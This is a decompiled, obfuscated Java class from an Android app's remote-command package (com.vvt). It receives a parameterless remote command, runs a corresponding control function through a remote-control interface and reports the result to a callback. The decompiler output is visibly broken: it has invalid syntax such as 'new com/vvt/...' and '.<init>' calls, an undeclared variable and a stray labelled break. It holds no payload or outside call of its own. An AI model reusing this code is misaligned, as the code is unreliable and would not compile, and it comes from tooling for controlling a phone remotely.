package com.vvt.remotecommand.processor;

import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;
import java.util.ArrayList;

/**
 *
 */
public abstract class b extends RemoteCommandProcessor {
    private static final boolean a = com.vvt.ak.a.a;
    private RemoteFunction b;
    private boolean c;

    public b(com.vvt.remotecontrol.a parama, boolean paramBoolean, RemoteFunction paramRemoteFunction) {
        super(parama);
        this.b = paramRemoteFunction;
        this.c = paramBoolean;
    }

    protected String a(Object paramObject)
    {
        return null;
    }

    public void a(RemoteCommand paramRemoteCommand, c paramc) {
        boolean bool1 = a;
        if (bool1) {}
        int i = paramRemoteCommand.getParameters().size();
        if (i != 0) {
            throw new com.vvt.remotecommand.exception.InvalidCommanFormatException();
        }

        boolean bool2 = this.c;
        if ((bool2) && (paramc != null)) {
            bool2 = a;
            if (bool2) {}
            paramc.a(paramRemoteCommand, this, null);
        }
        bool2 = a;
        if (bool2) {}
        localObject1 = h();
        Object localObject2 = new com/vvt/remotecontrol/ControlCommand;
        Object localObject3 = this.b;
        ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, null);
        localObject2 = ((com.vvt.remotecontrol.a)localObject1).execute((ControlCommand)localObject2);
        if (paramc != null) {
            bool2 = a;
            if (bool2) {}
            localObject3 = a(localObject2);
            bool2 = localObject2 instanceof RmtCtrlOutputStatusMessage;
            if (bool2) {
                localObject1 = localObject2;
                localObject1 = (RmtCtrlOutputStatusMessage)localObject2;
                bool2 = ((RmtCtrlOutputStatusMessage)localObject1).isSuccess();
                if (!bool2) {
                    break label181;
                }
                paramc.b(paramRemoteCommand, this, (String)localObject3);
            }
        }

        for (;;) {
            bool2 = a;
            if (bool2) {}
            return;
            label181:
            if (localObject3 == null) {
                localObject2 = (RmtCtrlOutputStatusMessage)localObject2;
                localObject1 = ((RmtCtrlOutputStatusMessage)localObject2).getMessage();
                boolean bool3 = a;
                if ((!bool3) || (localObject1 == null)) {
                    localObject1 = new com.vvt.remotecommand.exception.RemoteCommandException("Unknown.");
                    paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject1);
                } else {
                    localObject2 = new com.vvt.remotecommand.exception.RemoteCommandException("Unknown.");
                    paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject2);
                }
            } else {
                localObject1 = new com/vvt/remotecommand/exception/RemoteCommandException;
                ((RemoteCommandException)localObject1).<init>((String)localObject3);
                paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject1);
            }
        }
    }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */